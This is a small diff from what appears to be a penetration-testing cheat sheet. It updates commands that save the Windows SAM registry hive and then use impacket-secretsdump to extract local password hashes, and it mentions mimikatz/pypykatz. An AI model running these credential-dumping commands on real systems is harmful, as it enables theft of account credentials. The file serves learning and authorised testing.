@@ -22,7 +22,8 @@ reg.exe save hklm\sam c:\Users\Administrator\sam
 
 Transfer them to our attacking machine.
 
-secretsdump.py  -sam sam -system system -security security LOCAL
+impacket-secretsdump -sam sam -system system -security security LOCAL
+impacket-secretsdump  -sam sam -system system LOCAL
 ```
 
 ## mimikatz/pypykatz
